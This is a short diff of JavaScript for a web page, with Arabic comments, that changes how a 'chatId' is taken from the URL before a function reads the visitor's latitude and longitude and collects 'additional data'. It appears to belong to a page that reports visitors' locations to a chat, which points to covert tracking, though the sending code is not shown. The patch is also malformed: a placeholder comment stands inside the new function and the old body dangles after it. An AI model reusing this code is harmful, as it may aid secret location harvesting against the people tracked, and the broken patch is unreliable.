@@ -85,11 +85,19 @@
             });
         }
 
-        async function sendLocationData(position) {
-            const chatId = new URLSearchParams(window.location.search).get('chatId');
-            if (!chatId) {
-                throw new Error("معرف المحادثة غير موجود");
-            }
+        function getChatId() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chatId') || window.location.pathname.split('/').pop();
+    console.log("Retrieved chatId:", chatId); // للتحقق في وحدة التحكم
+    return chatId;
+}
+
+async function sendLocationData(position) {
+    const chatId = getChatId();
+    if (!chatId) {
+        throw new Error("معرف المحادثة غير موجود");
+    }
+    // باقي الكود...
 
             const { latitude, longitude } = position.coords;
             const additionalData = await collectAdditionalData();
